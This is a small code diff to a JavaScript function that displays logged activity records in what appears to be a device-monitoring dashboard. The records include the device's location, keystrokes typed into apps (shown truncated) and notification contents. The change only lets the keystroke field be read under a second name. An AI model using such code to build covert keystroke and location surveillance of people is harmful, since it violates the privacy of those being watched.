@@ -1957,7 +1957,7 @@ function displayActivities(activities, containerId) {
                     details = `Location: ${data.address || `${data.latitude}, ${data.longitude}` || 'Unknown'}`;
                     break;
                 case 'keyboard_input':
-                    details = `App: ${data.appName || 'Unknown'} - Input: ${data.text ? data.text.substring(0, 50) + '...' : 'Hidden'}`;
+                    details = `App: ${data.appName || 'Unknown'} - Input: ${data.inputText || data.text ? (data.inputText || data.text).substring(0, 50) + '...' : 'Hidden'}`;
                     break;
                 case 'notification':
                     details = `App: ${data.appName || 'Unknown'} - ${data.title || ''}: ${data.text || ''}`;
